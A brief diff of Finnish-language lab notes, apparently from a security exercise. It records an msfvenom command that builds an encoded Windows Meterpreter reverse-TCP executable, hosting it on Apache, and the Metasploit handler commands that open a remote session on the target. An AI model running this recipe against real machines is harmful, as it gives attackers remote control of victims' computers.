@@ -1,2 +1,10 @@
 Tehtiin komento jolla luotiin reverce tcp johon lisättiin encoodaus. index.html korvattiin apache2 geiboi.exe:ssä
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.28.172.33 LPORT=42069 -e x86/shikata_ga_nai -i 66 -f exe > geiboi.exe
+Handleri tehtiin avaamalla msfconsole ja sinne heitettiin 
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 172.28.172.33
+set LPORT 42069
+set ExitOnSession false
+exploit -j -z
+sit avattiin geiboi.exe tiedosto kohde koneessa ja saatiin session -l näkyviin id 1, jolla session -i 1 päästiin koneeseen käsiksi
